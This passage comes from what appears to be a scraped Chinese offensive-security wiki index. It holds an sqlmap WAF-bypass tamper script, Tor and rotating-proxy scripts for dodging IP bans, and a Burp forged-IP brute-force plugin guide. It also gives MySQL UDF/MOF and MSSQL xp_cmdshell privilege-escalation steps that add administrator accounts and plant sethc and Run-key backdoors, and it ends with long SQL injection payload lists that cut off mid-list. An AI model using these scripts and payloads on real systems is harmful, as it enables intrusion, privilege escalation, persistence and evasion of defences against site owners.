from lib.core.data import kb from lib.core.enums import PRIORITY from lib.core.common import singleTimeWarnMessage from lib.core.enums import DBMS __priority__ = PRIORITY.LOW def dependencies(): pass def tamper(payload, **kwargs): payload=payload.replace('ORDER','/*!00000order*/') payload=payload.replace('ALL SELECT','/*!00000all*/ /*!00000select') payload=payload.replace('CONCAT(',\"CONCAT/**/(\") payload=payload.replace(\"--\",\" */--\") payload=payload.replace(\"AND\",\"%26%26\") return payload 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-03 17:45:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap proxy/1.html":{"url":"Tools/Sqlmap proxy/1.html","title":"Tor-IP-Changer实现Sqlmap自动切换代理IP","keywords":"","body":"Tor-IP-Changer实现Sqlmap自动切换代理IP https://github.com/ianxtianxt/tor-ip-changer/ 使用工具： 小飞机、Proxifier、Tor Browser、Tor IP Changer、Sqlmap https://github.com/seevik2580/tor-ip-changer 操作步骤： 首先连上小飞机 配置Proxifier 配置代理服务器 配置代理规则 此时你已经是全局代理状态了 配置并打开Tor浏览器（不要关闭） 打开Tor IP Changer 点击 TOR server -> Start，等待软件自动配置完成 点击 Options -> Settings -> Interval(IP切换间隔时间，越快越不稳）-> Save 点击 IP changer -> Start，如下图所示即为成功 Sqlmap命令 sqlmap.py -u url --tor --tor-type=\"SOCKS5\" 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-20 21:50:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap proxy/2.html":{"url":"Tools/Sqlmap proxy/2.html","title":"Sqlmap rps脚本","keywords":"","body":"sqlmap rps脚本 PS:如果因为不可控因素脚本中的网站可能存在关站或者访问不了的情况，可以自行更改代理信息网站地址 ''' Rotating Proxy Server DKing@0-Sec ''' import sys,os,time,random,select import threading import logging import urllib2,socket import argparse import re timeout = 7 maxConnetions = 200 proxies = [] header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36'} def pickup_proxy(): return random.choice(proxies).split(':') def fetchproxy(url,reg,delay): logging.info(\"Fetching Proxies @ %s\",url) try: req = urllib2.Request(url,None,header) except: print(\"Failed to fetch proxies @ %s\",url) sys.exit response = urllib2.urlopen(req) html = response.read() p = re.compile(reg) proxy_list = p.findall(html) if len(proxy_list) > 0: for each_proxy in proxy_list[1:]: if len(each_proxy) == 4: if each_proxy[2] == 'HTTP' and float(each_proxy[3]) (\\d+\\.\\d+\\.\\d+\\.\\d+)\\n\\s+(\\d{2,5})\\n\\s+.{2,10}?\\n\\s+.{2,6}?\\n\\s+(.{4,8})?' reg_list_local=r'(\\d+\\.\\d+\\.\\d+\\.\\d+)\\n\\s+(\\d{2,5})\\n\\s+\\n\\s+.{30,50}?\\n\\s+\\n\\s+.{2,6}?\\n\\s+(.{4,8})?\\n\\s+\\n\\s+' reg_list_forg=r'(\\d+\\.\\d+\\.\\d+\\.\\d+)\\n\\s+(\\d{2,5})\\n\\s+\\n\\s+.{2,20}?\\n\\s+\\n\\s+.{2,6}?\\n\\s+(.{4,8})?\\n\\s+\\n\\s+' for i in range(page): fetchproxy(\"http://www.xicidaili.com/nn/\"+str(page),reg_list_local,delay) if foriegn == True: fetchproxy(\"http://www.xicidaili.com/wn/\"+str(page),reg_list_forg,delay) for eachline in proxies: fp.write(eachline+'\\n') fp.close() logging.info(\"Finished Fetching Proxies\") class Proxy: def __init__(self, addr): self.proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.proxy.bind(addr) self.proxy.listen(maxConnetions) self.inputs = {self.proxy:None} self.route = {} def serve_forever(self): while 1: readable, _, _ = select.select(list(self.inputs.keys()), [], []) for self.sock in readable: if self.sock == self.proxy: self.on_join() else: try: data = self.sock.recv(81920) except Exception, e: logging.error(str(e)) self.on_quit() continue if not data: self.on_quit() else: try: self.route[self.sock].send(data) except Exception, e: logging.error(str(e)) self.on_quit() continue def on_join(self): client, addr = self.proxy.accept() forward = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: subproxy_ip,subproxy_port=pickup_proxy() subproxy_port=int(subproxy_port) forward.settimeout(timeout) forward.connect((subproxy_ip,subproxy_port)) logging.info(\"%s:%d Forwarding success\",subproxy_ip,subproxy_port) except Exception, e: logging.error('%s:%d Error ... Switching to a New Proxy',subproxy_ip,subproxy_port) client.close() return self.inputs [client] = None self.inputs [forward] = None self.route[client] = forward self.route[forward] = client def on_quit(self): ls = [self.sock] if self.sock in self.route: ls.append(self.route[self.sock]) for s in ls: if s in self.inputs: del self.inputs[s] if s in self.route: del self.route[s] s.close() def main(): if len(sys.argv) == 1: print('\\n#python RPS.py -h for more options\\n') parser = argparse.ArgumentParser( description='\\t\\tRPS.py\\n\\tRotating Proxy Server\\nProvide a local HTTP Proxy Interface, forwarding your every request via different HTTP Proxies\\nCan be useful to \\'bypass\\' any Bans on IP from the website\\'s firewall', epilog='\\nDKing@0-Sec', prefix_chars='-/+', formatter_class=argparse.RawTextHelpFormatter ) parser.format_help parser.add_argument('--ip', type=str,default='127.0.0.1', help='Address to Listen on.\\t\\tDefault: 127.0.0.1') parser.add_argument('--port',type=int,default=8899, help='Port to Run on.\\t\\tDefault: 8899') parser.add_argument('--page',type=int, default=1, help='Pages to Crawl Proxy.\\t\\tDefault: 1') parser.add_argument('--delay', type=float, default=0.4, help='Max Delay of Proxies[second].\\tDefault: 0.4') parser.add_argument('--timeout', type=float, default=7, help='Timeout of each Request[second].\\tDefault: 7') parser.add_argument('--log', type=str,default='proxy.log', help='Logfile Name\\t\\t\\tDefault: proxy.log') parser.add_argument('--listname', type=str,default='proxylist.txt', help='Proxy List File Name[careful]\\tDefault: proxylist.txt') parser.add_argument('--uselist',action='store_true',default=False, help='Use Private Proxy list instead of fetch online.[sepcify with --listname]\\tDefault: OFF') parser.add_argument('--foriegn',action='store_true',default=False, help='Get Foriegn Proxy.[Very SLOW]\\tDefault: OFF') args = parser.parse_args() timeout=args.timeout logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s', datefmt='%m-%d %H:%M', filename=args.log, filemode='w') console = logging.StreamHandler() console.setLevel(logging.INFO) formatter = logging.Formatter('%(levelname)-5s %(message)s') console.setFormatter(formatter) logging.getLogger('').addHandler(console) if args.uselist == True: logging.info(\"Using Existing Proxy List\") for pline in open(args.listname,'r'): proxies.append(pline) elif os.path.exists(args.listname) and time.time() - os.path.getmtime(args.listname) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-21 20:41:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Burpsuit/1.html":{"url":"Tools/Burpsuit/1.html","title":"Burpsuit 伪造ip爆破脚本","keywords":"","body":"Burpsuit 伪造ip爆破脚本 https://github.com/ianxtianxt/burpsuiefakeip BurpFakeIP 四个小功能 伪造指定ip 伪造本地ip 伪造随机ip 随机ip爆破 0x01 伪造指定ip 在Repeater模块右键选择fakeIp菜单,然后点击inputIP功能,然后输入指定的ip 程序会自动添加所有可伪造得字段到请求头中。 0x02 伪造本地ip 在Repeater模块右键选择fakeIp菜单,然后点击127.0.0.1功能： 0x03 伪造随机ip 在Repeater模块右键选择fakeIp菜单,然后点击randomIP功能： 0x04 随机ip爆破 伪造随机ip爆破是本插件最核心的功能。 将数据包发送到Intruder模块,在Positions中切换Attack type为Pitchfork模式,选择好有效的伪造字段,以及需要爆破的字段: 按照箭头顺序将Payload来源设置为Extensin-generated,并设置负载伪fakeIpPayloads,然后设置第二个变量。 点击Start attack开始爆破. 如上图,实现每次爆破都使用不同的伪ip进行,避免被ban。 PS：伪造随机ip爆破的先决条件可以伪造ip绕过服务器限制。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-10 20:49:23 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"sql/sql提权手工辅助/1.html":{"url":"sql/sql提权手工辅助/1.html","title":"UDF手工提权辅助","keywords":"","body":"UDF手工提权辅助： select @@basedir; #查看mysql安装目录 select 'It is dll' into dumpfile 'C:\\。。lib::'; #利用NTFS ADS创建lib目录 select 'It is dll' into dumpfile 'C:\\。。lib\\plugin::'; #利用NTFS ADS创建plugin目录 select 0xUDFcode into dumpfile 'C:\\phpstu\\MySQL\\lib\\plugin\\mstlab.dll'; #导出udfcode，注意修改udfcode create function cmdshell returns string soname 'mstlab.dll'; #用udf创建cmd函数，shell,sys_exec,sys_eval select shell('cmd','net user'); #执行cmd命令 show variables like '%plugin%'; #查看plugin路径 小技巧： 1.HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MySQL 注册表中ImagePath的值为mysql安装目录 2.my.ini中datadir的值是数据存放目录 3.UPDATE user set File_priv ='Y'; flush privileges; 强制加file权限 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 01:39:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"sql/sql提权手工辅助/2.html":{"url":"sql/sql提权手工辅助/2.html","title":"MOF手工提权辅助","keywords":"","body":"MOF提权： #pragma namespace(\"\\\\.\\root\\subscription\") instance of __EventFilter as { EventNamespace = \"Root\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\") WSH.run(\\\"net.exe user admintony admin /add&&net.exe localgroup administrators admintony /add\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = ; Filter = ; }; 保存为 1.mof 然后mysql执行 select load_file('D:/wwwroot/1.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'; 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-03 20:20:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"sql/sql提权手工辅助/3.html":{"url":"sql/sql提权手工辅助/3.html","title":"SA手工提权辅助","keywords":"","body":"SA提权： 1.判断扩展存储是否存在： select count(*) from master.dbo.sysobjects where xtype = 'x' AND name= 'xp_cmdshell' select count(*) from master.dbo.sysobjects where name='xp_regread' 恢复： exec sp_dropextendedproc 'xp_cmdshell' exec sp_dropextendedproc xp_cmdshell,'xplog70.dll' EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;(SQL2005) 2.列目录： exec master..xp_cmdshell 'ver' (or) exec master..xp_dirtree 'c:\\',1,1 (or) drop table black create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))-- insert into black exec master..xp_cmdshell 'dir c:\\' select top 1 mulu from black where id=1 xp_cmdshell被删除时，可以用(4.a)开启沙盒模式，然后(4.b)方法提权 3.备份启动项： alter database [master] set RECOVERY FULL create table cmd (a image) backup log [master] to disk = 'c:\\cmd1' with init insert into cmd (a) values (0x(batcode)) backup log [master] to disk = 'C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动\\start.bat' drop table cmd 4.映像劫持 xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe','debugger','reg_sz','c:\\windows\\system32\\cmd.exe' 5.沙盒模式提权： 方法a ```exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\u0004.0\\Engines','SandBoxMode','REG_DWORD',0; #关闭沙盒模式 方法b： Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\\windows\\system32\\ias\\ias.mdb','select shell(\"net user mstlab mstlab /add\")'); #or c:\\windows\\system32\\ias\\dnary.mdb string类型用此。 开启OpenRowSet：exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE; ### 6.xp_regwrite操作注册表 exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows\\currentversion un','black','REG_SZ','net user test test /add' 开启xp_oacreate:exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE; ``` 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-03 20:23:57 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"sql/sql注入payloads/通用SQL注入Payloads.html":{"url":"sql/sql注入payloads/通用SQL注入Payloads.html","title":"通用SQL注入Payloads","keywords":"","body":"通用SQL注入Payloads ' '' ` `` , \" \"\" / // \\ \\\\ ; ' or \" -- or # ' OR '1 ' OR 1 -- - \" OR \"\" = \" \" OR 1 = 1 -- - ' OR '' = ' '=' 'LIKE' '=0--+ OR 1=1 ' OR 'x'='x ' AND id IS NULL; -- '''''''''''''UNION SELECT '2 %00 /*…*/ + addition, concatenate (or space in url) || (double pipe) concatenate % wildcard attribute indicator @variable local variable @@variable global variable # Numeric AND 1 AND 0 AND true AND false 1-false 1-true 1*56 -2 1' ORDER BY 1--+ 1' ORDER BY 2--+ 1' ORDER BY 3--+ 1' ORDER BY 1,2--+ 1' ORDER BY 1,2,3--+ 1' GROUP BY 1,2,--+ 1' GROUP BY 1,2,3--+ ' GROUP BY columnnames having 1=1 -- -1' UNION SELECT 1,2,3--+ ' UNION SELECT sum(columnname ) from tablename -- -1 UNION SELECT 1 INTO @,@ -1 UNION SELECT 1 INTO @,@,@ 1 AND (SELECT * FROM Users) = 1 ' AND MID(VERSION(),1,1) = '5'; ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') -- Finding the table name Time-Based: ,(select * from (select(sleep(10)))a) %2c(select%20*%20from%20(select(sleep(10)))a) ';WAITFOR DELAY '0:0:30'-- Comments: # Hash comment /* C-style comment -- - SQL comment ;%00 Nullbyte ` Backtick 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-27 23:20:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"sql/sql注入payloads/常规 Error Based Payloads.html":{"url":"sql/sql注入payloads/常规 Error Based Payloads.html","title":"常规 Error Based Payloads","keywords":"","body":"常规 Error Based Payloads OR 1=1 OR 1=0 OR x=x OR x=y OR 1=1# OR 1=0# OR x=x# OR x=y# OR 1=1-- OR 1=0-- OR x=x-- OR x=y-- OR 3409=3409 AND ('pytW' LIKE 'pytW OR 3409=3409 AND ('pytW' LIKE 'pytY HAVING 1=1 HAVING 1=0 HAVING 1=1# HAVING 1=0# HAVING 1=1-- HAVING 1=0-- AND 1=1 AND 1=0 AND 1=1-- AND 1=0-- AND 1=1# AND 1=0# AND 1=1 AND '%'=' AND 1=0 AND '%'=' AND 1083=1083 AND (1427=1427 AND 7506=9091 AND (5913=5913 AND 1083=1083 AND ('1427=1427 AND 7506=9091 AND ('5913=5913 AND 7300=7300 AND 'pKlZ'='pKlZ AND 7300=7300 AND 'pKlZ'='pKlY AND 7300=7300 AND ('pKlZ'='pKlZ AND 7300=7300 AND ('pKlZ'='pKlY AS INJECTX WHERE 1=1 AND 1=1 AS INJECTX WHERE 1=1 AND 1=0 AS INJECTX WHERE 1=1 AND 1=1# AS INJECTX WHERE 1=1 AND 1=0# AS INJECTX WHERE 1=1 AND 1=1-- AS INJECTX WHERE 1=1 AND 1=0-- WHERE 1=1 AND 1=1 WHERE 1=1 AND 1=0 WHERE 1=1 AND 1=1# WHERE 1=1 AND 1=0# WHERE 1=1 AND 1=1-- WHERE 1=1 AND 1=0-- ORDER BY 1-- ORDER BY 2-- ORDER BY 3-- ORDER BY 4-- ORDER BY 5-- ORDER BY 6-- ORDER BY 7-- ORDER BY 8-- ORDER BY 9-- ORDER BY 10-- ORDER BY 11-- ORDER BY 12-- ORDER BY 13-- ORDER BY 14-- ORDER BY 15-- ORDER BY 16-- ORDER BY 17-- ORDER BY 18-- ORDER BY 19-- ORDER BY 20-- ORDER BY 21-- ORDER BY 22-- ORDER BY 23-- ORDER BY 24-- ORDER BY 25-- ORDER BY 26-- ORDER BY 27-- ORDER BY 28-- ORDER BY 29-- ORDER BY 30-- ORDER BY 31337-- ORDER BY 1# ORDER BY 2# ORDER BY 3# ORDER BY 4# ORDER BY 5# ORDER BY 6# ORDER BY 7# ORDER BY 8# ORDER BY 9# ORDER BY 10# ORDER BY 11# ORDER BY 12# ORDER BY 13# ORDER BY 14# ORDER BY 15# ORDER BY 16# ORDER BY 17# ORDER BY 18# ORDER BY 19# ORDER BY 20# ORDER BY 21# ORDER BY 22# ORDER BY 23# ORDER BY 24# ORDER BY 25# ORDER BY 26# ORDER BY 27# ORDER BY 28# ORDER BY 29# ORDER BY 30# ORDER BY 31337# ORDER BY 1 ORDER BY 2 ORDER BY 3 ORDER BY 4 ORDER BY 5 ORDER BY 6 ORDER BY 7 ORDER BY 8 ORDER BY 9 ORDER BY 10 ORDER BY 11 ORDER BY 12 ORDER BY 13 ORDER BY 14 ORDER BY 15 ORDER BY 16 ORDER BY 17 ORDER BY 18 ORDER BY 19 ORDER BY 20 ORDER BY 21 ORDER BY 22 ORDER BY 23 ORDER BY 24 ORDER BY 25 ORDER BY 26 ORDER BY 27 ORDER BY 28 ORDER BY 29 ORDER BY 30 ORDER BY 31337 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl-- IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- %' AND 8310=8310 AND '%'=' %' AND 8310=8311 AND '%'=' and (select substring(@@version,1,1))='X' and (select substring(@@version,1,1))='M' and (select substring(@@version,2,1))='i' and (select substring(@@version,2,1))='y' and (select substring(@@version,3,1))='c' and (select substring(@@version,3,1))='S' and (select substring(@@version,3,1))='X' 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-27 23:20:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"sql/sql注入payloads/通用 Time Based SQL Injection Payloads.html":{"url":"sql/sql注入payloads/通用 Time Based SQL Injection Payloads.html","title":"通用 Time Based SQL Injection Payloads","keywords":"","body":"通用 Time Based SQL Injection Payloads # from wapiti sleep(5)# 1 or sleep(5)# \" or sleep(5)# ' or sleep(5)# \" or sleep(5)=\" ' or sleep(5)=' 1) or sleep(5)# \") or sleep(5)=\" ') or sleep(5)=' 1)) or sleep(5)# \")) or sleep(5)=\" ')) or sleep(5)=' ;waitfor delay '0:0:5'-- );waitfor delay '0:0:5'-- ';waitfor delay '0:0:5'-- \";waitfor delay '0:0:5'-- ');waitfor delay '0:0:5'-- \");waitfor delay '0:0:5'-- ));waitfor delay '0:0:5'-- '));waitfor delay '0:0:5'-- \"));waitfor delay '0:0:5'-- benchmark(10000000,MD5(1))# 1 or benchmark(10000000,MD5(1))# \" or benchmark(10000000,MD5(1))# ' or benchmark(10000000,MD5(1))# 1) or benchmark(10000000,MD5(1))# \") or benchmark(10000000,MD5(1))# ') or benchmark(10000000,MD5(1))# 1)) or benchmark(10000000,MD5(1))# \")) or benchmark(10000000,MD5(1))# ')) or benchmark(10000000,MD5(1))# pg_sleep(5)-- 1 or pg_sleep(5)-- \" or pg_sleep(5)-- ' or pg_sleep(5)-- 1) or pg_sleep(5)-- \") or pg_sleep(5)-- ') or pg_sleep(5)-- 1)) or pg_sleep(5)-- \")) or pg_sleep(5)-- ')) or pg_sleep(5)-- AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)# SLEEP(5)# SLEEP(5)-- SLEEP(5)=\" SLEEP(5)=' or SLEEP(5) or SLEEP(5)# or SLEEP(5)-- or SLEEP(5)=\" or SLEEP(5)=' waitfor delay '00:00:05' waitfor delay '00:00:05'-- waitfor delay '00:00:05'# benchmark(50000000,MD5(1)) benchmark(50000000,MD5(1))-- benchmark(50000000,MD5(1))# or benchmark(50000000,MD5(1)) or benchmark(50000000,MD5(1))-- or benchmark(50000000,MD5(1))# pg_SLEEP(5) pg_SLEEP(5)-- pg_SLEEP(5)# or pg_SLEEP(5) or pg_SLEEP(5)-- or pg_SLEEP(5)# '\\\" AnD SLEEP(5) AnD SLEEP(5)-- AnD SLEEP(5)# &&SLEEP(5) &&SLEEP(5)-- &&SLEEP(5)# ' AnD SLEEP(5) ANd '1 '&&SLEEP(5)&&'1 ORDER BY SLEEP(5) ORDER BY SLEEP(5)-- ORDER BY SLEEP(5)# (SELECT * FROM (SELECT(SLEEP(5)))ecMj) (SELECT * FROM (SELECT(SLEEP(5)))ecMj)# (SELECT * FROM (SELECT(SLEEP(5)))ecMj)-- +benchmark(3200,SHA1(1))+' + SLEEP(10) + ' RANDOMBLOB(500000000/2) AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) RANDOMBLOB(1000000000/2) AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/ 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-27 23:19:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"sql/sql注入payloads/通用 Union Select Payloads.html":{"url":"sql/sql注入payloads/通用 Union Select Payloads.html","title":"通用 Union Select Payloads","keywords":"","body":"通用 Union Select Payloads ORDER BY SLEEP(5) ORDER BY 1,SLEEP(5) ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')) ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 ORDER BY SLEEP(5)# ORDER BY 1,SLEEP(5)# ORDER BY 1,SLEEP(5),3# ORDER BY 1,SLEEP(5),3,4# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27# ORDER BY 